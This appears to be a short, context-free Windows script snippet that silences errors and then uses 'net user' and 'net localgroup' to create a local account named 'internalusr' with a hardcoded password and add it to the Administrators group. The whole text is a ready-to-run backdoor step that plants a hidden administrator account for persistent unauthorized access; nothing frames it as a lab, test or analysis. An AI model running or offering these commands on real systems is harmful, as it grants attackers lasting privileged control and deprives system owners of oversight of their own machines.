$ErrorActionPreference = ‘SilentlyContinue’
net user /add internalusr passA-JHG123
net localgroup administrators internalusr /add
